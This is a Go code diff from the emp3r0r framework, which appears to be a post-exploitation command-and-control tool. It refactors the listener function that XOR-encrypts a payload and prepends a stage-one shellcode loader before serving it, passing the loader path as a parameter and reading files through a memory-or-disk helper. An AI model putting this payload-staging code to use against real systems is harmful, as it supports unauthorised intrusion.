@@ -2,13 +2,10 @@ package listener
 
 import (
 	"fmt"
-	"os"
-	"path/filepath"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
-
-const stage1LoaderEnv = "EMP3R0R_STAGE1_LOADER"
 
 func xorData(data []byte, key []byte) {
 	if len(key) == 0 {
@@ -19,38 +16,11 @@ func xorData(data []byte, key []byte) {
 	}
 }
 
-func resolveStage1LoaderPath() string {
-	if p := os.Getenv(stage1LoaderEnv); p != "" {
-		return p
-	}
-
-	candidates := []string{
-		"modules/shellcode_stager/loader.bin",
-		"core/modules/shellcode_stager/loader.bin",
-	}
-
-	for _, p := range candidates {
-		if _, err := os.Stat(p); err == nil {
-			return p
-		}
-	}
-
-	if cwd, err := os.Getwd(); err == nil {
-		for _, rel := range candidates {
-			p := filepath.Join(cwd, rel)
-			if _, err := os.Stat(p); err == nil {
-				return p
-			}
-		}
-	}
-
-	return ""
-}
-
-func buildServedBlob(payloadPath string, keyStr string, compression bool) ([]byte, error) {
-	payload, err := os.ReadFile(payloadPath)
+func buildServedBlob(payloadPath string, keyStr string, loaderPath string, compression bool) ([]byte, error) {
+	// ReadFileAgent handles both mem:// and disk paths
+	payload, err := util.ReadFileAgent(payloadPath)
 	if err != nil {
-		return nil, fmt.Errorf("failed to read payload file: %v", err)
+		return nil, fmt.Errorf("failed to read payload: %v", err)
 	}
 
 	key := deriveKeyFromString(keyStr)
@@ -62,12 +32,11 @@ func buildServedBlob(payloadPath string, keyStr string, compression bool) ([]byt
 	}
 	encryptedPayload := encryptData(toEncrypt, key)
 
-	loaderPath := resolveStage1LoaderPath()
 	if loaderPath == "" {
 		return encryptedPayload, nil
 	}
 
-	loader, err := os.ReadFile(loaderPath)
+	loader, err := util.ReadFileAgent(loaderPath)
 	if err != nil {
 		return nil, fmt.Errorf("failed to read stage1 loader (%s): %v", loaderPath, err)
 	}
